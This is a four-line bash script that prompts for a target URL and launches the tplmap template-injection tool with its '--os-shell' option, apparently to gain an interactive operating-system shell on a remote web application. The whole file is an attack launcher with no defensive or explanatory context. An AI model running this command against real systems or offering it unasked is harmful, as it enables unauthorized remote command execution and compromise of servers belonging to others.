#!/bin/bash
echo -ne "[+] Enter Absolute Parameter URL: "
read target
python tplmap.py --os-shell -u "$target"
